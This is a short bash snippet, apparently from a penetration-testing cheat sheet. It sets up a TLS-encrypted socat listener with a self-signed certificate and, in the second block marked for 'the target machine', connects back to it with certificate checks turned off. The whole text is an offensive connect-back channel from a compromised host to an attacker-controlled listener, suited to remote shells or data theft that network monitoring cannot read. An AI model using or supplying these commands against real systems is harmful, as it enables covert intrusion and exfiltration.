```bash
openssl req -newkey rsa:2048 -nodes -keyout bind.key -x509 -days 1000 -subj '/CN=www.mydom.com/O=My Company Name LTD./C=US' -out bind.crt
cat bind.key bind.crt > bind.pem
# start to listen
socat -d -d OPENSSL-LISTEN:$PORT,cert=bind.pem,verify=0,fork STDOUT
```

```bash
# on the target machine connect back
socat - OPENSSL:$TARGET:$PORT,verify=0
```